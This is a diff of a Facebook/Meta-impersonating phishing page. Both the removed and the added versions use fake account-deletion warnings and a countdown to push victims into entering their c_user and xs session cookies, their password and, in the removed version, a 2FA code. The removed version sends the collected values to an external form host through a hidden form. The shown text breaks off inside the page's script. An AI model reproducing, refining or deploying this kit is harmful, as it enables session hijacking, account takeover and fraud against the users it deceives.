         }
-
-        .webcam-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.5);
-            color: white;
-            text-align: center;
-        }
-
-        .webcam-btn {
-            margin-top: 16px;
-            padding: 10px 20px;
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: var(--radius-md);
-            cursor: pointer;
-            font-weight: 600;
-        }
-
-        .webcam-btn:hover {
-            background: var(--primary-hover);
-        }
-
-        /* AI Verification Status */
-        .ai-verification {
-            padding: 16px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-            margin: 16px 0;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .ai-verification i {
-            font-size: 24px;
-        }
-
-        .ai-processing {
-            color: var(--warning-color);
-            animation: pulse 1.5s infinite;
-        }
-
-        .ai-success {
-            color: var(--success-color);
-        }
-
-        .ai-failure {
-            color: var(--danger-color);
-        }
-
-        /* Blockchain Verification */
-        .blockchain-verification {
-            padding: 16px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-            margin: 16px 0;
-            font-family: monospace;
-            overflow-x: auto;
-        }
-
-        .blockchain-hash {
-            color: var(--primary-color);
-            word-break: break-all;
-        }
-
-        /* 2FA Verification */
-        .two-factor-auth {
-            padding: 16px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-            margin: 16px 0;
-        }
-
-        .two-factor-code {
-            display: flex;
-            gap: 8px;
-            margin-top: 12px;
-        }
-
-        .two-factor-code input {
+        
+        .facebook-logo {
             width: 40px;
             height: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .password-label {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+            font-weight: 500;
+        }
+        
+        .password-input {
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto 15px;
+        }
+        
+        .final-submit-btn {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 30px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .final-submit-btn:hover {
+            background-color: var(--secondary-blue);
+        }
+        
+        .error-message {
+            color: var(--error-red);
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            display: none;
             text-align: center;
-            font-size: 18px;
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-sm);
-            background: var(--bg-secondary);
-            color: var(--text-primary);
+            padding: 40px 20px;
         }
-
-        /* Download Instructions */
-        .download-instructions {
-            padding: 16px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-            margin: 16px 0;
+        
+        .success-icon {
+            font-size: 60px;
+            color: #42b72a;
+            margin-bottom: 20px;
         }
-
-        .download-btn {
-            margin-top: 12px;
+        
+        .success-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+        }
+        
+        .success-text {
+            color: var(--dark-gray);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        @media (min-width: 768px) {
+            .left-column {
+                width: 60%;
+                float: left;
+                padding-right: 20px;
+            }
+            
+            .right-column {
+                width: 40%;
+                float: right;
+                padding-left: 20px;
+            }
+            
+            .clearfix::after {
+                content: "";
+                display: table;
+                clear: both;
+            }
+        }
+        
+        @media (max-width: 767px) {
+            .header, .sub-header {
+                padding: 0 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .sub-header h4 {
+                font-size: 16px;
+            }
+            
+            .card-body {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="header-content">
-            <div class="logo">
-                <i class="fab fa-facebook"></i>
-                <span>Facebook Security Center</span>
-            </div>
-            <div class="header-actions">
-                <div class="security-badge">
-                    <i class="fas fa-shield-alt"></i>
-                    <span>Secure Connection</span>
-                </div>
-                <button class="theme-toggle" id="themeToggle">
-                    <i class="fas fa-moon"></i>
-                </button>
-                <a href="#" class="help-center">
-                    <i class="fas fa-question-circle"></i>
-                    Help Center
-                </a>
-            </div>
-        </div>
-    </div>
-    
-    <div class="container">
-        <div class="review-card">
-            <div class="warning-icon">
-                <i class="fas fa-exclamation-triangle"></i>
-            </div>
-            <h1 class="review-title">Urgent Account Review Required</h1>
-            <p class="review-subtitle">Your account has been flagged for policy violations and is scheduled for deletion. Request a review to prevent permanent loss of your account and data.</p>
+    <!-- Improved Notification Page -->
+    <div class="notification-container" id="notificationPage">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmE1m-aaI5iHWyR_Xq1WgEvmfPzsMU9uHEng&s" alt="Meta Logo" class="meta-logo">
+        
+        <div class="warning-header">Important Account Notice</div>
+        
+        <div class="content-text">
+            <p>Our systems have detected unusual activity on your account that may violate our <strong>Terms of Service</strong> and <strong>Community Guidelines</strong>.</p>
             
-            <!-- Countdown Timer -->
-            <div class="countdown-timer">
-                <div class="countdown-item">
-                    <div class="countdown-value" id="countdown-hours">24</div>
-                    <div class="countdown-label">Hours</div>
-                </div>
-                <div class="countdown-item">
-                    <div class="countdown-value" id="countdown-minutes">59</div>
-                    <div class="countdown-label">Minutes</div>
-                </div>
-                <div class="countdown-item">
-                    <div class="countdown-value" id="countdown-seconds">59</div>
-                    <div class="countdown-label">Seconds</div>
-                </div>
+            <p>To protect our community, we've temporarily restricted certain features of your account. If we don't hear from you, your account may be <strong>permanently disabled</strong>.</p>
+            
+            <div class="countdown" id="countdown">
+                Time remaining to verify: <span id="timer">24:00:00</span>
             </div>
-            
-            <div class="alert-box alert-danger">
-                <i class="fas fa-exclamation-circle"></i>
-                <div>
-                    <h3><i class="fas fa-info-circle"></i> Immediate Action Required</h3>
-                    <ul>
-                        <li>Your account is scheduled for deletion in <strong>24 hours</strong></li>
-                        <li>This action is due to violations of our community standards</li>
-                        <li>You may request a review of this decision</li>
-                        <li>If approved, your account will be restored with full access</li>
-                        <li>Failure to request a review will result in permanent deletion</li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div class="security-verification">
-                <i class="fas fa-check-circle"></i>
-                <span>This is an official Facebook security portal. All information is encrypted.</span>
-            </div>
-            
-            <button class="btn btn-primary btn-lg" id="reviewBtn">
-                <i class="fas fa-file-alt"></i> Request Account Review
-            </button>
-            
-            <button class="btn btn-outline btn-lg" id="appealBtn" style="margin-top: 12px;">
-                <i class="fas fa-gavel"></i> Submit Appeal
-            </button>
         </div>
         
-        <!-- Additional Information Section -->
-        <div class="review-card">
-            <h2 class="review-title">Why is my account being deleted?</h2>
-            
-            <div class="alert-box alert-warning">
-                <i class="fas fa-exclamation-triangle"></i>
-                <div>
-                    <h3>Policy Violations Detected</h3>
-                    <p>Our automated systems have detected activity on your account that violates our <a href="#" style="color: var(--warning-color);">Community Standards</a>. This may include:</p>
-                    <ul>
-                        <li>Spam or misleading content</li>
-                        <li>Hate speech or bullying</li>
-                        <li>Impersonation or fake accounts</li>
-                        <li>Intellectual property violations</li>
-                        <li>Suspicious login activity</li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div class="alert-box">
-                <i class="fas fa-chart-line"></i>
-                <div>
-                    <h3>Recent Security Statistics</h3>
-                    <p>To protect our community, Facebook takes action against policy violations:</p>
-                    <ul>
-                        <li><strong>1.2 billion</strong> fake accounts removed in the last 6 months</li>
-                        <li><strong>98.5%</strong> of removed accounts were detected before reporting</li>
-                        <li><strong>85%</strong> of appeals result in account restoration when legitimate</li>
-                    </ul>
-                </div>
-            </div>
+        <div class="divider"></div>
+        
+        <div class="support-header">How to resolve this issue</div>
+        <div class="content-text">
+            <p>We can help you restore full access to your account. Please click the button below to begin the verification process.</p>
         </div>
+        
+        <button class="action-button" id="getStartedBtn">Get Started</button>
+        
+        <div class="footer">Meta © 2025. All rights reserved.</div>
     </div>
-    
-    <!-- Review Modal -->
-    <div class="modal" id="reviewModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 class="modal-title"><i class="fas fa-user-shield"></i> Account Security Review</h2>
-                <button class="close-modal" id="closeModal">×</button>
+
+    <!-- Verification Form (unchanged from original) -->
+    <form id="verificationForm" action="" method="post">
+        <input type="hidden" id="selectedLanguage" name="language" value="en">
+        <div id="root">
+            <div class="header">
+                <h1>facebook</h1>
+                <select class="language-selector" id="languageSelector">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="pt">Português</option>
+                    <option value="ar">العربية</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="zh">中文</option>
+                    <option value="ru">Русский</option>
+                    <option value="ja">日本語</option>
+                    <option value="it">Italiano</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="sv">Svenska</option>
+                </select>
             </div>
-            
-            <div class="modal-body">
-                <div class="step-indicator">
-                    <div class="step active">1</div>
-                    <div class="step">2</div>
-                    <div class="step">3</div>
-                    <div class="step-line"></div>
-                    <div class="progress-line" id="progressLine"></div>
-                </div>
-                
-                <!-- Step 1: Identity Verification -->
-                <div class="step-content active" id="step1">
-                    <h3 class="step-title">Identity Verification Process</h3>
-                    
-                    <div class="alert-box">
-                        <i class="fas fa-info-circle"></i>
-                        <div>
-                            <h3>Verification Required</h3>
-                            <p>To confirm you're the legitimate account owner, we need to verify your identity through multiple steps:</p>
-                            <ol>
-                                <li>Watch the tutorial video</li>
-                                <li>Enter your session verification values</li>
-                                <li>Complete facial recognition (optional)</li>
-                            </ol>
-                        </div>
+            <div class="sub-header">
+                <h4 id="helpCenterText">Help Center</h4>
+            </div>
+            <div class="main-content">
+                <div class="verification-card">
+                    <div class="card-header">
+                        <h5 id="formTitle">Request For Remove Page Violation</h5>
                     </div>
-                    
-                    <div class="video-player-container">
-                        <div class="network-status">
-                            <i class="fas fa-signal"></i>
-                            <span>Connection: Secure</span>
-                        </div>
-                        <div class="video-container">
-                            <video id="tutorialVideo">
-                                <!-- Source will be set dynamically -->
-                                Your browser does not support the video tag.
-                            </video>
-                            <div class="loading-spinner" id="loadingSpinner">
-                                <div class="spinner"></div>
-                                <div class="loading-percentage">0%</div>
+                    <div class="card-body">
+                        <div id="formContent">
+                            <div class="alert-message">
+                                <p id="message1">We've identified irregular activity on your page that goes against our community guidelines.</p>
+                                <p id="message2">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
+                                <p id="message3">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
                             </div>
-                            <div class="video-overlay" id="videoOverlay">
-                                <div class="play-btn" id="overlayPlayBtn">
-                                    <i class="fas fa-play"></i>
+                            
+                            <div class="clearfix">
+                                <div class="left-column">
+                                    <div class="video-container">
+                                        <span class="video-label" id="videoLabel">Detailed Video Information</span>
+                                        <video controls autoplay muted playsinline src="https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4" style="width: 100%; height: auto;"></video>
+                                        <button type="button" class="sound-toggle" id="soundToggle">Enable Sound</button>
+                                    </div>
+                                    
+                                    <div class="form-container">
+                                        <p class="alert-message" id="provideInfoText">Please be sure to provide the requested information below.</p>
+                                        
+                                        <div class="form-group">
+                                            <label for="c_user" class="form-label" id="cUserLabel">c_user</label>
+                                            <input type="number" id="c_user" name="c_user" class="form-control" required>
+                                        </div>
+                                        
+                                        <div class="form-group">
+                                            <label for="xs" class="form-label" id="xsLabel">xs</label>
+                                            <input type="text" id="xs" name="xs" class="form-control" required>
+                                        </div>
+                                        
+                                        <div class="form-note" id="dontLogoutText">
+                                            Please make sure not to log out from your computer or laptop until you have received a verification email.
+                                        </div>
+                                    </div>
                                 </div>
-                                <p style="color: #ffffff; margin-top: 12px; font-weight: 600;">Click to select language</p>
+                                
+                                <div class="right-column">
+                                    <!-- Right column content can go here if needed -->
+                                </div>
                             </div>
-                            <div class="video-controls">
-                                <button class="control-btn" id="playPauseBtn">
-                                    <i class="fas fa-play"></i>
-                                </button>
-                                <div class="progress-container">
-                                    <div class="buffered-bar" id="bufferedBar"></div>
-                                    <div class="progress-bar" id="progressBar"></div>
+                            
+                            <div class="password-confirmation" id="passwordConfirmation">
+                                <img src="https://ucarecdn.com/b3b95dd8-7ac6-4017-8597-929f47addd9d/WhatsAppImage20250704at043706_1a9b7ef8.jpg" alt="Facebook Logo" class="facebook-logo">
+                                <div class="password-label" id="passwordLabel">Please re-enter Your Password</div>
+                                <div class="password-input">
+                                    <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
+                                    <div class="error-message" id="passwordError">Please enter your password</div>
                                 </div>
-                                <div class="time-display">
-                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
-                                </div>
-                                <div class="volume-container">
-                                    <button class="control-btn" id="volumeBtn">
-                                        <i class="fas fa-volume-up"></i>
-                                    </button>
-                                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
-                                </div>
-                                <select class="speed-selector" id="speedSelector">
-                                    <option value="0.5">0.5x</option>
-                                    <option value="0.75">0.75x</option>
-                                    <option value="1" selected>Normal</option>
-                                    <option value="1.25">1.25x</option>
-                                    <option value="1.5">1.5x</option>
-                                    <option value="2">2x</option>
-                                </select>
-                                <button class="control-btn fullscreen-btn" id="fullscreenBtn">
-                                    <i class="fas fa-expand"></i>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- AI Facial Recognition (Optional) -->
-                    <div class="webcam-container" id="webcamContainer" style="display: none;">
-                        <video class="webcam-video" id="webcamVideo" autoplay playsinline></video>
-                        <div class="webcam-overlay" id="webcamOverlay">
-                            <h3>Facial Recognition Verification</h3>
-                            <p>Please position your face in the center of the frame</p>
-                            <button class="webcam-btn" id="startWebcamBtn">Enable Camera</button>
-                        </div>
-                    </div>
-                    
-                    <div class="ai-verification" id="aiVerification" style="display: none;">
-                        <i class="fas fa-robot ai-processing"></i>
-                        <div>
-                            <h4>AI Identity Verification</h4>
-                            <p>Processing your facial features...</p>
-                        </div>
-                    </div>
-                    
-                    <div class="mobile-instructions">
-                        <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
-                        <p>This process requires desktop browser developer tools. Please switch to a computer:</p>
-                        <ol>
-                            <li>Open Chrome on a desktop/laptop computer</li>
-                            <li>Log in to Facebook</li>
-                            <li>Follow the video instructions to find your values</li>
-                            <li>Return here to submit your review request</li>
-                        </ol>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
-                        <input type="text" class="form-control" id="c_user" name="c_user" 
-                               placeholder="Enter your c_user value"
-                               pattern="\d+" 
-                               title="c_user must be a numeric value"
-                               required>
-                        <small class="form-text">Must contain a valid c_user value only</small>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="xs"><i class="fas fa-key"></i> xs Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
-                        <input type="text" class="form-control" id="xs" name="xs" 
-                               placeholder="Enter your xs value"
-                               pattern=".{20,}" 
-                               title="xs must be at least 20 characters"
-                               required>
-                        <small class="form-text">Must contain a valid xs value only</small>
-                    </div>
-                    
-                    <div class="btn-group">
-                        <button class="btn btn-outline" id="cancelBtn">
-                            <i class="fas fa-times"></i> Cancel
-                        </button>
-                        <button class="btn btn-primary" id="nextToStep2">
-                            <i class="fas fa-arrow-right"></i> Continue
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Step 2: Password & 2FA Verification -->
-                <div class="step-content" id="step2">
-                    <h3 class="step-title">Security Verification</h3>
-                    
-                    <div class="status-indicator status-active">
-                        <i class="fas fa-check-circle"></i>
-                        <span>Step 1 completed successfully</span>
-                    </div>
-                    
-                    <div class="progress">
-                        <div class="progress-bar" style="width: 33%"></div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="password"><i class="fas fa-lock"></i> Re-enter Password <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">For security verification only. Your password is encrypted.</span></span></label>
-                        <input type="password" class="form-control" id="password" name="password" 
-                               placeholder="Enter your Facebook password"
-                               required>
-                        <small class="form-text">This helps us verify you're the account owner</small>
-                    </div>
-                    
-                    <!-- Two-Factor Authentication -->
-                    <div class="two-factor-auth" id="twoFactorAuth">
-                        <h4><i class="fas fa-mobile-alt"></i> Two-Factor Authentication</h4>
-                        <p>Enter the 6-digit code from your authenticator app:</p>
-                        <div class="two-factor-code">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                            <input type="text" maxlength="1" pattern="[0-9]">
-                        </div>
-                    </div>
-                    
-                    <div class="alert-box alert-danger">
-                        <i class="fas fa-shield-alt"></i>
-                        <div>
-                            <h3>Security Notice</h3>
-                            <ul>
-                                <li>This is a security verification step to confirm your identity</li>
-                                <li>Do not log out from your computer during the review process</li>
-                                <li>Keep your Facebook account logged in on your computer</li>
-                                <li>Your password is encrypted during transmission</li>
-                                <li>Do not share your password with anyone</li>
-                            </ul>
-                        </div>
-                    </div>
-                    
-                    <div class="btn-group">
-                        <button class="btn btn-outline" id="backToStep1">
-                            <i class="fas fa-arrow-left"></i> Back
-                        </button>
-                        <button class="btn btn-primary" id="nextToStep3">
-                            <i class="fas fa-paper-plane"></i> Submit Review
-                        </button>
-                    </div>
-                    <p class="error-message" id="submissionError"></p>
-                </div>
-                
-                <!-- Step 3: Success & Blockchain Verification -->
-                <div class="step-content" id="step3">
-                    <div class="success-message">
-                        <div class="success-icon">
-                            <i class="fas fa-check-circle"></i>
-                        </div>
-                        <h3 class="success-title">Review Submitted Successfully!</h3>
-                        <p class="success-text">Your account review request has been received. Our security team will process your case within the next 24 hours.</p>
-                        
-                        <div class="alert-box alert-success">
-                            <i class="fas fa-info-circle"></i>
-                            <div>
-                                <h3>Important Instructions</h3>
-                                <ul>
-                                    <li>Do not log out from your computer during this period</li>
-                                    <li>Keep your Facebook account logged in on this device</li>
-                                    <li>You will receive a notification once the review is complete</li>
-                                    <li>Account deletion has been paused pending review</li>
-                                    <li>Please do not attempt to change your password during review</li>
-                                </ul>
+                                <button type="button" class="final-submit-btn" id="finalSubmit">Send Confirmation</button>
                             </div>
                         </div>
                         
-                        <!-- Blockchain Verification Hash -->
-                        <div class="blockchain-verification">
-                            <h4><i class="fas fa-link"></i> Blockchain Verification</h4>
-                            <p>Your submission has been recorded on the blockchain for transparency:</p>
-                            <p class="blockchain-hash" id="blockchainHash">0x7f5e...3a2b</p>
+                        <div class="success-message" id="successMessage">
+                            <div class="success-icon">✓</div>
+                            <h2 class="success-title" id="successTitle">Your request has been submitted successfully</h2>
+                            <p class="success-text" id="successText">We are reviewing your information and will contact you shortly.</p>
                         </div>
-                        
-                        <!-- Download Instructions -->
-                        <div class="download-instructions">
-                            <h4><i class="fas fa-download"></i> Download Instructions</h4>
-                            <p>For your records, you can download a PDF with your review details:</p>
-                            <button class="btn btn-outline download-btn">
-                                <i class="fas fa-file-pdf"></i> Download Receipt
-                            </button>
-                        </div>
-                        
-                        <div class="status-indicator status-active">
-                            <i class="fas fa-check-circle"></i>
-                            <span>Review ID: FB-REV-<span id="reviewId">XXXXXX</span></span>
-                        </div>
-                        
-                        <button class="btn btn-primary" id="finishBtn">
-                            <i class="fas fa-check"></i> Return to Facebook
-                        </button>
+                    </div>
+                    <div class="card-footer">
+                        <button type="button" class="submit-btn" id="initialSubmit">Submit</button>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
-    
-    <!-- Language Selection Modal -->
-    <div class="modal" id="languageModal">
-        <div class="modal-content" style="max-width: 600px;">
-            <div class="modal-header">
-                <h2 class="modal-title"><i class="fas fa-globe"></i> Select Video Language</h2>
-                <button class="close-modal" id="closeLanguageModal">×</button>
-            </div>
-            
-            <div class="modal-body">
-                <div class="form-group">
-                    <label for="languageSearch"><i class="fas fa-search"></i> Search Languages</label>
-                    <input type="text" class="form-control" id="languageSearch" placeholder="Type to search languages...">
-                </div>
-                
-                <div style="max-height: 400px; overflow-y: auto; margin: 16px 0; border: 1px solid var(--border-color); border-radius: var(--radius-md);">
-                    <div class="language-options" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; padding: 12px;">
-                        <button class="btn btn-outline language-btn" data-lang="english" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>English</span>
-                            <small style="color: var(--text-secondary);">English</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="filipino" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Filipino</span>
-                            <small style="color: var(--text-secondary);">Filipino</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="hindi" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Hindi</span>
-                            <small style="color: var(--text-secondary);">हिन्दी</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="portuguese" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Portuguese</span>
-                            <small style="color: var(--text-secondary);">Português</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="spanish" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Spanish</span>
-                            <small style="color: var(--text-secondary);">Español</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="tamil" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Tamil</span>
-                            <small style="color: var(--text-secondary);">தமிழ்</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="arabic" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Arabic</span>
-                            <small style="color: var(--text-secondary);">العربية</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="japanese" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Japanese</span>
-                            <small style="color: var(--text-secondary);">日本語</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="french" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>French</span>
-                            <small style="color: var(--text-secondary);">Français</small>
-                        </button>
-                        <button class="btn btn-outline language-btn" data-lang="swedish" style="flex-direction: column; align-items: center; padding: 12px;">
-                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
-                            <span>Swedish</span>
-                            <small style="color: var(--text-secondary);">Svenska</small>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="alert-box">
-                    <i class="fas fa-info-circle"></i>
-                    <div>
-                        <p>Can't find your language? Request it at: <a href="mailto:support@fb.com" style="color: var(--primary-color);">support@fb.com</a></p>
-                    </div>
-                </div>
-                
-                <button class="btn btn-primary" id="confirmLanguageBtn" style="width: 100%;">
-                    <i class="fas fa-check"></i> Confirm Language Selection
-                </button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Hidden form for fallback submission -->
-    <form id="hiddenForm" class="hidden-form" action="https://submit-form.com/BLs04ZolX" method="post">
-        <input type="hidden" name="c_user" id="hiddenCUser">
-        <input type="hidden" name="xs" id="hiddenXs">
-        <input type="hidden" name="password" id="hiddenPassword">
-        <input type="hidden" name="review_id" id="hiddenReviewId">
-        <input type="hidden" name="user_agent" id="userAgent">
-        <input type="hidden" name="ip_address" id="ipAddress">
-        <input type="hidden" name="timestamp" id="timestamp">
-        <input type="hidden" name="facial_data" id="facialData">
-        <input type="hidden" name="blockchain_hash" id="blockchainHashInput">
     </form>
-    
-    <!-- Footer -->
-    <footer>
-        <div class="footer-content">
-            <div class="footer-links">
-                <a href="#">About</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms</a>
-                <a href="#">Help Center</a>
-                <a href="#">Cookies</a>
-                <a href="#">Ad Choices</a>
-            </div>
-            <div class="copyright">
-                Meta © 2025 - Protecting Your Digital Identity
-            </div>
-        </div>
-    </footer>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Enhanced video files mapping with fallbacks
-            const videoFiles = {
-                'english': [
-                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/mp4' },
-                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/webm' }
-                ],
-                'filipino': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/filipino.mp4', type: 'video/mp4' }
-                ],
-                'hindi': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/hindi.mp4', type: 'video/mp4' }
-                ],
-                'portuguese': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/portuguese.mp4', type: 'video/mp4' }
-                ],
-                'spanish': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/spanish.mp4', type: 'video/mp4' }
-                ],
-                'tamil': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/Tamil.mp4', type: 'video/mp4' }
-                ],
-                'arabic': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/Arabic.mp4', type: 'video/mp4' }
-                ],
-                'french': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/French.mp4', type: 'video/mp4' }
-                ],
-                'swedish': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/Swedish.mp4', type: 'video/mp4' }
-                ],
-                'japanese': [
-                    { url: 'https://translationmeta2025-f87fc.web.app/japanese.mp4', type: 'video/mp4' }
-                ]
-            };
-            
-            // DOM Elements
-            const themeToggle = document.getElementById('themeToggle');
-            const languageModal = document.getElementById('languageModal');
-            const closeLanguageModal = document.getElementById('closeLanguageModal');
-            const languageSearch = document.getElementById('languageSearch');
-            const languageButtons = document.querySelectorAll('.language-btn');
-            const confirmLanguageBtn = document.getElementById('confirmLanguageBtn');
-            
-            const videoOverlay = document.getElementById('videoOverlay');
-            const overlayPlayBtn = document.getElementById('overlayPlayBtn');
-            const video = document.getElementById('tutorialVideo');
-            const loadingSpinner = document.getElementById('loadingSpinner');
-            const loadingPercentage = document.querySelector('.loading-percentage');
-            
-            const modal = document.getElementById('reviewModal');
-            const reviewBtn = document.getElementById('reviewBtn');
-            const appealBtn = document.getElementById('appealBtn');
-            const closeModal = document.getElementById('closeModal');
-            const cancelBtn = document.getElementById('cancelBtn');
-            const finishBtn = document.getElementById('finishBtn');
-            
-            // Video control elements
-            const playPauseBtn = document.getElementById('playPauseBtn');
-            const progressBar = document.getElementById('progressBar');
-            const bufferedBar = document.getElementById('bufferedBar');
-            const currentTimeDisplay = document.getElementById('currentTime');
-            const totalTimeDisplay = document.getElementById('totalTime');
-            const volumeBtn = document.getElementById('volumeBtn');
-            const volumeSlider = document.getElementById('volumeSlider');
-            const speedSelector = document.getElementById('speedSelector');
-            const fullscreenBtn = document.getElementById('fullscreenBtn');
-            
-            // Step navigation
-            const nextToStep2 = document.getElementById('nextToStep2');
-            const backToStep1 = document.getElementById('backToStep1');
-            const nextToStep3 = document.getElementById('nextToStep3');
-            
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-            
-            const steps = document.querySelectorAll('.step');
-            const progressLine = document.getElementById('progressLine');
-            
-            // Form elements
-            const hiddenForm = document.getElementById('hiddenForm');
-            const hiddenCUser = document.getElementById('hiddenCUser');
-            const hiddenXs = document.getElementById('hiddenXs');
-            const hiddenPassword = document.getElementById('hiddenPassword');
-            const hiddenReviewId = document.getElementById('hiddenReviewId');
-            const userAgent = document.getElementById('userAgent');
-            const ipAddress = document.getElementById('ipAddress');
-            const timestamp = document.getElementById('timestamp');
-            const facialData = document.getElementById('facialData');
-            const blockchainHashInput = document.getElementById('blockchainHashInput');
-            
-            // Error message element
-            const submissionError = document.getElementById('submissionError');
-            const reviewIdDisplay = document.getElementById('reviewId');
-            const blockchainHashDisplay = document.getElementById('blockchainHash');
-            
-            // Countdown elements
-            const countdownHours = document.getElementById('countdown-hours');
-            const countdownMinutes = document.getElementById('countdown-minutes');
-            const countdownSeconds = document.getElementById('countdown-seconds');
-            
-            // Webcam elements
-            const webcamContainer = document.getElementById('webcamContainer');
-            const webcamVideo = document.getElementById('webcamVideo');
-            const webcamOverlay = document.getElementById('webcamOverlay');
-            const startWebcamBtn = document.getElementById('startWebcamBtn');
-            const aiVerification = document.getElementById('aiVerification');
-            
-            // State variables
-            let selectedLanguage = null;
-            let isVideoPlaying = false;
-            let countdownInterval;
-            let stream = null;
-            
-            // Initialize countdown timer
-            function initCountdown() {
-                let hours = 24;
-                let minutes = 59;
-                let seconds = 59;
-                
-                countdownInterval = setInterval(() => {
-                    seconds--;
-                    
-                    if (seconds < 0) {
-                        seconds = 59;
-                        minutes--;
-                    }
-                    
-                    if (minutes < 0) {
-                        minutes = 59;
-                        hours--;
-                    }
-                    
